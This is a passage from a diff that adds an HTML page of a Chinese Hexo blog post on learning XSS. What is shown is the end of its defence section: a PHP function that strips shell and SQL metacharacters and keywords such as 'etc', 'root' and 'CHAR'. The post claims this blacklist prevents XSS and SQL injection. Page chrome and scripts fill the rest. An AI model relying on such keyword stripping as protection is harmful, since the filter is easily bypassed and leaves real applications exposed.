class="string">"+"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" -- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" --"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"("</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">")"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#123;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#125;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"."</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"response"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"write"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"|"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"etc"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"root"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"//"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"!="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"$"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"=="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"#"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"@"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"mailto:"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CHAR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"char"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将非法字符都过滤掉可以一定程度上防止XSS也可以防止SQL注入。</p>
+
+      
+    </div>
+    
+    
+    
+
+
+<div>
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束 <i class="fa fa-heart"></i> 感谢阅读-------------</div>
+    
+</div>
+</div>
+ 
+
+    
+
+    
+
+    
+
+
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/" rel="next" title="基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建">
+                <i class="fa fa-chevron-left"></i> 基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="Darren-zl">
+            
+              <p class="site-author-name" itemprop="name">Darren-zl</p>
+              <p class="site-description motion-element" itemprop="description">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Darren-zl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/p/1005052390784733/home?from=page_100505&mod=TAB&pids=plc_main" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web安全之XSS漏洞学习实战"><span class="nav-number">1.</span> <span class="nav-text">web安全之XSS漏洞学习实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-编写一个存在XSS漏洞的页面"><span class="nav-number">1.1.</span> <span class="nav-text">1.编写一个存在XSS漏洞的页面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-利用XSS"><span class="nav-number">1.2.</span> <span class="nav-text">2.利用XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-利用XSS漏洞还可以做什么。"><span class="nav-number">1.3.</span> <span class="nav-text">3.利用XSS漏洞还可以做什么。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-如何防御XSS"><span class="nav-number">1.4.</span> <span class="nav-text">4.如何防御XSS</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Darren-zl</span>
+
+  
+</div>
+
+
+  <!--<div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>-->
+
+
+
+ <!-- <span class="post-meta-divider">|</span>-->
+
+
+
+  <!--<div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>-->
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  <div class="bg_content">
+    <canvas id="canvas"></canvas>
+</div>
+
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytxCyGhU';
+      var conf = '90b283bdb7ccb472f325f3c891156b33';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("29xnQ1C2kcwORHYYn7xsWTnS-gzGzoHsz", "Rq1Gk75oRwH78BryWUL4oYzj");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+</body>
+</html>
